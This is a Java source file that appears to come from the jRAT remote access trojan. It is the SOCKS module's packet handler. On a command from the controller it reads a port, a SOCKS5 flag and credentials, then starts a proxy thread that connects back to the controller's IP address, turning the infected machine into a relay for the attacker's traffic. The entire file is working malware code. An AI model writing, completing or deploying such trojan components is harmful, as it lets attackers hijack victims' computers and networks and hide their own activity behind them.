package jrat.module.socks.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.common.listeners.ConnectionListener;
import jrat.module.socks.ServerThread;

public class PacketControl implements IncomingPacket {

    public void read(Connection con) throws Exception {
        boolean start = con.readBoolean();

        if (start) {
            boolean socks5 = con.readBoolean();
            int port = con.readInt();
            boolean auth = con.readBoolean();
            String user = con.readLine();
            String pass = con.readLine();

            String host = con.getSocket().getInetAddress().getHostAddress();
            
            final ServerThread thread = new ServerThread(host, port, user, pass, socks5, auth);

            con.addConnectionListener(new ConnectionListener() {
                @Override
                public void onDisconnect(Exception ex) {
                    ServerThread.stopProxy();
                }
            });

            thread.start();
        } else {
            ServerThread.stopProxy();
        }
    }
}
